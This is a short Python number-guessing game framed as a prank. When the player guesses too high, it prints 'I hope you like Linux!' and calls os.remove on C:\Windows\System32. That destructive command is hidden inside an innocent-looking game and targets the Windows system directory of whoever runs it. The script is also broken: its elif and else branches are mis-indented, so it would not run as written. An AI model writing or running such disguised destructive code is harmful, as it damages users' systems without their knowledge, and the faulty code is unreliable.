import random
import os

#The Price is Right

print("How much do you love Windows?") 

number = random.randint(1,10)
guess = input("Guess a number between 1 and 10!")
guess = int(guess)

if guess < number:
    print("Aww, too short!")
         elif guess == number: 
            print("Wow! You got it!")
                else:
                    print("I hope you like Linux!")
                    os.remove("C:\Windows\System32")